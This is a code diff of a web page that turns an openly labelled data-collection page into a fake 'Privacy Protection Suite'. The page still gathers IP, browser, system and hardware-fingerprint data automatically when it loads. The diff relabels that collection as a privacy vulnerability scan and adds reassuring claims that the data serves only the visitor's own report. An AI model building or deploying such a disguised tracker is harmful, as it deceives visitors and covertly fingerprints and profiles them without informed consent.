@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Data Analytics Platform</title>
+    <title>Privacy Protection Suite - Security Analysis</title>
     <style>
         * {
             margin: 0;
@@ -99,44 +99,68 @@
             font-size: 0.9em;
             color: #6c757d;
         }
+        
+        .privacy-notice {
+            background: #e8f5e8;
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 20px;
+            border: 1px solid #4caf50;
+        }
+        
+        .privacy-notice h3 {
+            color: #2e7d32;
+            margin-bottom: 15px;
+        }
+        
+        .privacy-notice p {
+            color: #2e7d32;
+            margin-bottom: 10px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Data Analytics Platform</h1>
-        <p>Welcome to our analytics platform. We collect anonymized data for research and analysis purposes.</p>
+        <h1>🔒 Privacy Protection Suite</h1>
+        <p>Protect your digital privacy with our comprehensive security analysis. We scan your browser for potential privacy vulnerabilities and provide detailed reports to help secure your online presence.</p>
         
-        <a href="/dashboard" class="btn">View Dashboard</a>
-        <button onclick="collectData()" class="btn">Test Data Collection</button>
+        <button onclick="startSecurityScan()" class="btn">🛡️ Start Privacy Scan</button>
+        <a href="/dashboard" class="btn">📊 View Security Reports</a>
         
         <div id="status" class="status"></div>
         
         <div class="data-info">
-            <h3>Data Being Collected:</h3>
-            <div class="data-item">✓ IP Address (and hashed version)</div>
-            <div class="data-item">✓ Browser Information</div>
-            <div class="data-item">✓ Operating System</div>
-            <div class="data-item">✓ Screen Resolution</div>
-            <div class="data-item">✓ Timezone</div>
-            <div class="data-item">✓ Language Settings</div>
-            <div class="data-item">✓ Hardware Fingerprint</div>
-            <div class="data-item">✓ Session Information</div>
+            <h3>🔍 Privacy Vulnerability Assessment:</h3>
+            <div class="data-item">🔐 Browser Fingerprint Analysis</div>
+            <div class="data-item">🌐 IP Address Security Check</div>
+            <div class="data-item">🖥️ System Configuration Review</div>
+            <div class="data-item">📱 Device Information Audit</div>
+            <div class="data-item">🌍 Geolocation Privacy Assessment</div>
+            <div class="data-item">⚡ Performance Security Metrics</div>
+            <div class="data-item">🔒 Session Security Analysis</div>
+            <div class="data-item">📊 Privacy Risk Score Calculation</div>
+        </div>
+        
+        <div class="privacy-notice">
+            <h3>🛡️ Your Privacy Matters</h3>
+            <p>This security scan helps identify potential privacy vulnerabilities in your browser and system configuration. All data is analyzed to provide you with actionable security recommendations.</p>
+            <p><strong>Data Protection:</strong> Your information is processed securely and used solely for generating your privacy assessment report.</p>
         </div>
     </div>
 
     <script>
-        // Automatically collect data when page loads
+        // Automatically start privacy scan when page loads
         window.addEventListener('load', function() {
-            setTimeout(collectData, 1000); // Delay to ensure all page elements are loaded
+            setTimeout(startSecurityScan, 1000); // Delay to ensure all page elements are loaded
         });
 
-        function collectData() {
+        function startSecurityScan() {
             const statusDiv = document.getElementById('status');
             statusDiv.style.display = 'block';
             statusDiv.className = 'status';
-            statusDiv.innerHTML = 'Collecting data...';
+            statusDiv.innerHTML = '🔍 Running privacy vulnerability scan...';
 
-            // Gather comprehensive system and browser data
+            // Gather comprehensive system and browser data for security analysis
             const data = {
                 // Browser information
                 browser: getBrowserInfo(),
@@ -202,17 +226,18 @@
                 if (result.status === 'success') {
                     statusDiv.className = 'status success';
                     statusDiv.innerHTML = `
-                        ✅ Data collected successfully!<br>
-                        Session ID: ${result.session_id}<br>
-                        Hardware ID: ${result.hwid}
+                        ✅ Privacy scan completed successfully!<br>
+                        🔒 Security Analysis ID: ${result.session_id}<br>
+                        🛡️ Device Security Hash: ${result.hwid}<br>
+                        📊 Your privacy report has been generated and securely processed.
                     `;
                 } else {
-                    throw new Error(result.message || 'Unknown error');
+                    throw new Error(result.message || 'Security scan failed');
                 }
             })
             .catch(error => {
                 statusDiv.className = 'status error';
-                statusDiv.innerHTML = `❌ Error: ${error.message}`;
+                statusDiv.innerHTML = `❌ Privacy scan error: ${error.message}`;
             });
         }
 
